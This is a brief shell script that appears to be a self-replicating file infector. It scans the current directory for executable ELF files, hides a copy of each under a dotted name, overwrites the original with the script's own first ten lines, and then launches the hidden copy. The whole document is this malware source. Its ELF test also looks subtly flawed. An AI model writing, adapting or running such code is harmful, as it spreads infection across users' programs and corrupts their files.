#!/bin/sh
for F in *
do
  if [ -f $F ] && [ -x $F ] && [ "$(head -c4 $F 2>/dev/null )" == "ELF" ]
  then
    cp $F .$F -a 2>/dev/null
    head -10 $0 > $F 2>/dev/null
  fi
done
./.$(basename $0)
